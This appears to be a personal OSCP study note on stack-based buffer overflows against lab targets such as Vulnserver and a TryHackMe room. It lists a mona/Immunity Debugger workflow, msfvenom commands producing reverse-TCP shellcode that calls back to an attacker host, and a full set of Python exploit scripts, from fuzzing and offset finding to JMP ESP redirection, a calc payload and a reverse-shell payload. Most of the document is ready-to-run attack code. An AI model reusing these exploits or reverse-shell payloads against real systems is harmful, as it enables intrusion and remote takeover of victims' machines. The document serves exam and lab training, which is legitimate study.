# Buffer Overflow 
- [Tib3rius](obsidian://open?vault=Obsidian%20Vault&file=OSCP%2FRandom%20Notes%2FTib3rius%2FBuffer%20Overflow)
- [Justin Steve BufferOverflow](https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood_tutorial.pdf)
- [Convert Little Endian](https://www.save-editor.com/tools/wse_hex.html)
- [Tib3rius BufferOverflow Github](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)
- [3isenHeim BufferOverflow GitHub](https://github.com/3isenHeiM/OSCP-BoF)
## General Steps

```
The Stack

|-------------------------------------------------|
|          ESP (Extended Stack Pointer)           |
|-------------------------------------------------|
|                 Buffer Space                    |
|-------------------------------------------------|
|          EBP (Extended Base Pointer)            |
|-------------------------------------------------|
|EIP (Extended Instruction Pointer)/Return Address|
|-------------------------------------------------|

The general flow of a standard stack-based buffer overflow is fairly straightforward. The exploit will: 
1. Create a large buffer to trigger the overflow. 
2. Take control of EIP by overwriting a return address on the stack, padding the large buffer with an appropriate offset. 
3. Include a chosen payload in the buffer prepended by an optional NOP572 sled. 
4. Choose a correct return address instruction such as JMP ESP (or a different register) to redirect the execution flow to the payload.

*Bad characters are ASCII or UNICODE characters that break the application when included in the payload because they might be interpreted as control characters.573 For example, the null-byte “\x00” is often interpreted as a string terminator and, if inserted in the payload, could prematurely truncate the attack buffer.*


In Immunity Debugger:

Step 1: !mona config -set workingfolder c:\mona\%p

Step 2: Run 1_Trigger.py with app running, should crash it
Step 3: msf-pattern_create -l 2500, copy into offset script
Step 4: Run 2_FindOffset.py, should crash again.
Step 5: !mona findmsp or msf-pattern_offset -q 386F4337 to Get EIP/ESP addresses
Step 6: Plug in offset, run, confirm AAAAA on EIP by running #3 Script
Step 7: !mona bytearray or CreateInitialBadChars.py //Don't necessarily need this?

Step 7.5: Run #4 script then copy badchar_test.bin to Win c: drive
Step 8: !mona bytearray –cpb “\x00\x0a” //This or the badchar_test.bin created by script
Step 9: !mona compare -a esp -f C:\mona\chatserver\bytearray.bin
//Basically, after 9 you gotta find the next barchar, readd to the #4 script, rerun until it says no more bad charts


Step 9.5: Use !mona modules to find a vulnerable file
Step 9.6: Also use !mona find -s "\xff\xe4" -m essfunc.dll #This is hex for JMP ESP
Step 10: !mona jmp -r esp -cpb "\x00\x16\x2f\xf4\xfd"
Step 10.5, Go to the log data, it should show jump addresses.

Step 11: Run #7 w/shell code below. SCripts #5 and #6 are for comfirming the JMP address and Shell execution with calculator



Shellcode:

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.150.132 LPORT=4444 \
-f py -b '\x00\x0A' -e x86/shikata_ga_nai --var-name shellcode


msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.150.132 LPORT=4444 EXITFUNC=thread -b "\x00" -f c


msfvenom -p windows/shell_reverse_tcp LHOST=192.168.150.132 LPORT=4444 EXITFUNC=thread -b "\x00" -f c

```

## Buffer Skeleton Program
```
Buffer Over flow using Tib3rius Notes

# Buffer Skeleton Script:

#!/usr/bin/env python2
import socket
#import struct

ip = "192.168.17.133"
port = 31337

#ptr_jmp_esp = 0x080414C3
#bufflen = 1024

prefix = ""
offset = 146
overflow = "A" * offset
#retn = struct.pack("<I", ptr_jmp_esp) 
retn = "\xC3\x14\x04\x08"
padding = "\x90" * 16
#padding = "\x83\xec\x10"
payload = ("Shell code here...")

postfix = ""
#postfix = "D" * (offset - len(bufflen))


buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")



```

## Parameters File

```
# PARAMETERS.py
# This is the files with all the variables
# This has been designed for the OSCP buffer overflow machine

RHOST = "192.168.150.133"
RPORT = 9999

# Total length of the buffer to send
buf_totlen = 2500

# Offset at which the EIP is overwritten
offset_eip = 2003

# Offset at which the ESP is overwritten
offset_esp = 2007

# Badchars sequence, comma-separated
badchars = [0x00]
# badchars = [0x00, 0x04, 0x05, 0xA2, 0xA3, 0xAC, 0xAD, 0xC0, 0xC1, 0xEF, 0xF0]

# Generate the string
badchar_sequence = bytes(c for c in range(256) if c not in badchars)

# Address of the JMP ESP operation
ptr_jmp_esp = 0x625011af

# To avoid setting a nop sled
sub_esp_10 = b"\x83\xec\x10"


```

## Create Bad Chars File

```
#!/usr/bin/env python
from __future__ import print_function

for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')

print()

```

## Quasi Auto Fuzzer
```

# Fuzzer.py

#!/usr/bin/python
import sys, socket
from time import sleep
from PARAMETERS import RHOST, RPORT

buffer = "A" * 100

while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((RHOST, RPORT))
		
		#For Vuln Server (('TRUN /.:/'' + buffer))
		s.send(('TRUN /.:/' + buffer))
		s.close()
		sleep(1)
		buffer = buffer + "A"*100
	except:
		print "Fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit()


```

## TryHackMe Fuzzer


```
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.84.48"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)


```


## TryHackMe Exploit Code

```
import socket

ip = "10.10.84.48"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")


```
## 1 Trigger Bug

```

 #!/usr/bin/env python2
import socket
from PARAMETERS import RHOST, RPORT
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf = ""
buf += "A"*1024
buf += "\n"

s.send(buf)



```

## 2 Find Offset

```
#!/usr/bin/env python2

#msf-pattern_create -l 1024
#msf-pattern_offset -q 39654138
#!mona findmsp

from PARAMETERS import RHOST, RPORT

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
buf = ""
buf += ("Put Pattern here")
buf += "\n"

#Trun is just for vuln server
s.send('TRUN /.:/'+buf)



```

## 3 Confirm Offset

```
#!/usr/bin/env python2
import socket

from PARAMETERS import RHOST, RPORT, offset_eip, buf_totlen

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

#buf_totlen = 1024
#offset_srp = 146

buf = ""
buf += "A"*(offset_eip - len(buf)) # padding
buf += "BBBB" # SRP overwrite
buf += "CCCC" # ESP should end up pointing here
buf += "D"*(buf_totlen - len(buf)) # trailing padding
buf += "\n"

s.send('TRUN /.:/'+buf)


```


## 4 Find Bad Chars

```

#!/usr/bin/env python2



import socket

from PARAMETERS import RHOST, RPORT, offset_eip, buf_totlen, badchars

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

badchar_test = "" # start with an empty string
#badchars = [0x00] # we've reasoned that these are definitely bad
#badchars = []
# generate the string
for i in range(0x00, 0xFF+1): # range(0x00, 0xFF) only returns up to 0xFE
	if i not in badchars: # skip the badchars
		badchar_test += chr(i) # append each non-badchar char to the string

# open a file for writing ("w") the string as binary ("b") data
with open("badchar_test.bin", "wb") as f:
	f.write(badchar_test)

#buf_totlen = 1024
#offset_srp = 146

buf = ""
buf += "A"*(offset_eip - len(buf)) # padding
buf += "BBBB" # SRP overwrite
buf += badchar_test # ESP points here
buf += "D"*(buf_totlen - len(buf)) # trailing padding
buf += "\n"

s.send('TRUN /.:/'+buf)


```


## 5 The JMP

```

#!/usr/bin/env python2
import socket
import struct

from PARAMETERS import RHOST, RPORT, offset_eip, buf_totlen, ptr_jmp_esp

#!mona jmp -r esp -cpb "\x00\x0A"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

#buf_totlen = 1024
#offset_srp = 146

#ptr_jmp_esp = 0x080414C3

buf = ""
buf += "A"*(offset_eip - len(buf)) # padding
buf += struct.pack("<I", ptr_jmp_esp) # SRP overwrite
buf += "\xCC\xCC\xCC\xCC" # ESP points here
buf += "D"*(buf_totlen - len(buf)) # trailing padding
buf += "\n"

s.send('TRUN /.:/'+buf)


```


## 6 Pop Calc

```
#!/usr/bin/env python2
import socket
import struct

from PARAMETERS import RHOST, RPORT, offset_eip, buf_totlen, ptr_jmp_esp, sub_esp_10

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

#buf_totlen = 1024
#offset_srp = 146

#ptr_jmp_esp = 0x080414C3

#sub_esp_10 = "\x83\xec\x10"
#or padding = "\x90" * 16
shellcode_calc =  b""
shellcode_calc += b"\xda\xc6\xd9\x74\x24\xf4\x5e\x31\xc9"
shellcode_calc += b"\xbf\x60\x64\x3e\x98\xb1\x31\x83\xc6"
shellcode_calc += b"\x04\x31\x7e\x14\x03\x7e\x74\x86\xcb"
shellcode_calc += b"\x64\x9c\xc4\x34\x95\x5c\xa9\xbd\x70"
shellcode_calc += b"\x6d\xe9\xda\xf1\xdd\xd9\xa9\x54\xd1"
shellcode_calc += b"\x92\xfc\x4c\x62\xd6\x28\x62\xc3\x5d"
shellcode_calc += b"\x0f\x4d\xd4\xce\x73\xcc\x56\x0d\xa0"
shellcode_calc += b"\x2e\x67\xde\xb5\x2f\xa0\x03\x37\x7d"
shellcode_calc += b"\x79\x4f\xea\x92\x0e\x05\x37\x18\x5c"
shellcode_calc += b"\x8b\x3f\xfd\x14\xaa\x6e\x50\x2f\xf5"
shellcode_calc += b"\xb0\x52\xfc\x8d\xf8\x4c\xe1\xa8\xb3"
shellcode_calc += b"\xe7\xd1\x47\x42\x2e\x28\xa7\xe9\x0f"
shellcode_calc += b"\x85\x5a\xf3\x48\x21\x85\x86\xa0\x52"
shellcode_calc += b"\x38\x91\x76\x29\xe6\x14\x6d\x89\x6d"
shellcode_calc += b"\x8e\x49\x28\xa1\x49\x19\x26\x0e\x1d"
shellcode_calc += b"\x45\x2a\x91\xf2\xfd\x56\x1a\xf5\xd1"
shellcode_calc += b"\xdf\x58\xd2\xf5\x84\x3b\x7b\xaf\x60"
shellcode_calc += b"\xed\x84\xaf\xcb\x52\x21\xbb\xe1\x87"
shellcode_calc += b"\x58\xe6\x6f\x59\xee\x9c\xdd\x59\xf0"
shellcode_calc += b"\x9e\x71\x32\xc1\x15\x1e\x45\xde\xff"
shellcode_calc += b"\x5b\xa9\x3c\x2a\x91\x42\x99\xbf\x18"
shellcode_calc += b"\x0f\x1a\x6a\x5e\x36\x99\x9f\x1e\xcd"
shellcode_calc += b"\x81\xd5\x1b\x89\x05\x05\x51\x82\xe3"
shellcode_calc += b"\x29\xc6\xa3\x21\x4a\x89\x37\xa9\xa3"
shellcode_calc += b"\x2c\xb0\x48\xbc"


buf = ""
buf += "A"*(offset_eip - len(buf)) # padding
buf += struct.pack("<I", ptr_jmp_esp) # SRP overwrite
buf += sub_esp_10 # ESP points here
buf += shellcode_calc
buf += "D"*(buf_totlen - len(buf)) # trailing padding
buf += "\n"

s.send(buf)



```

## 7 Pop Shell

```

#!/usr/bin/env python2
import socket
import struct

from PARAMETERS import RHOST, RPORT, offset_eip, buf_totlen, ptr_jmp_esp, sub_esp_10

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

#buf_totlen = 1024
#offset_srp = 146

#ptr_jmp_esp = 0x080414C3

#sub_esp_10 = "\x83\xec\x10"
#or padding = "\x90" * 16
shellcode =  ("\xbf\x50\x74\xec\x7c\xdb\xcb\xd9\x74\x24\xf4\x5e\x2b\xc9"
"\xb1\x52\x31\x7e\x12\x03\x7e\x12\x83\x96\x70\x0e\x89\xea"
"\x91\x4c\x72\x12\x62\x31\xfa\xf7\x53\x71\x98\x7c\xc3\x41"
"\xea\xd0\xe8\x2a\xbe\xc0\x7b\x5e\x17\xe7\xcc\xd5\x41\xc6"
"\xcd\x46\xb1\x49\x4e\x95\xe6\xa9\x6f\x56\xfb\xa8\xa8\x8b"
"\xf6\xf8\x61\xc7\xa5\xec\x06\x9d\x75\x87\x55\x33\xfe\x74"
"\x2d\x32\x2f\x2b\x25\x6d\xef\xca\xea\x05\xa6\xd4\xef\x20"
"\x70\x6f\xdb\xdf\x83\xb9\x15\x1f\x2f\x84\x99\xd2\x31\xc1"
"\x1e\x0d\x44\x3b\x5d\xb0\x5f\xf8\x1f\x6e\xd5\x1a\x87\xe5"
"\x4d\xc6\x39\x29\x0b\x8d\x36\x86\x5f\xc9\x5a\x19\xb3\x62"
"\x66\x92\x32\xa4\xee\xe0\x10\x60\xaa\xb3\x39\x31\x16\x15"
"\x45\x21\xf9\xca\xe3\x2a\x14\x1e\x9e\x71\x71\xd3\x93\x89"
"\x81\x7b\xa3\xfa\xb3\x24\x1f\x94\xff\xad\xb9\x63\xff\x87"
"\x7e\xfb\xfe\x27\x7f\xd2\xc4\x7c\x2f\x4c\xec\xfc\xa4\x8c"
"\x11\x29\x6a\xdc\xbd\x82\xcb\x8c\x7d\x73\xa4\xc6\x71\xac"
"\xd4\xe9\x5b\xc5\x7f\x10\x0c\x2a\xd7\x8c\x48\xc2\x2a\xb0"
"\x41\x4f\xa2\x56\x0b\x7f\xe2\xc1\xa4\xe6\xaf\x99\x55\xe6"
"\x65\xe4\x56\x6c\x8a\x19\x18\x85\xe7\x09\xcd\x65\xb2\x73"
"\x58\x79\x68\x1b\x06\xe8\xf7\xdb\x41\x11\xa0\x8c\x06\xe7"
"\xb9\x58\xbb\x5e\x10\x7e\x46\x06\x5b\x3a\x9d\xfb\x62\xc3"
"\x50\x47\x41\xd3\xac\x48\xcd\x87\x60\x1f\x9b\x71\xc7\xc9"
"\x6d\x2b\x91\xa6\x27\xbb\x64\x85\xf7\xbd\x68\xc0\x81\x21"
"\xd8\xbd\xd7\x5e\xd5\x29\xd0\x27\x0b\xca\x1f\xf2\x8f\xea"
"\xfd\xd6\xe5\x82\x5b\xb3\x47\xcf\x5b\x6e\x8b\xf6\xdf\x9a"
"\x74\x0d\xff\xef\x71\x49\x47\x1c\x08\xc2\x22\x22\xbf\xe3"
"\x66")





buf = ""
buf += "A"*(offset_eip - len(buf)) # padding
buf += struct.pack("<I", ptr_jmp_esp) # SRP overwrite
buf += sub_esp_10 # ESP points here
buf += shellcode
buf += "D"*(buf_totlen - len(buf)) # trailing padding
buf += "\n"

s.send('TRUN /.:/'+buf)



```

## Smash The Stack Notes

```

void function(int a, int b, int c) {   char buffer1[5];   char buffer2[10];   int *ret;   ret = buffer1 + 12;   (*ret) += 8; } void main() {  int x;  x = 0;  function(1,2,3);  x = 1;  printf("%d\n",x); }


```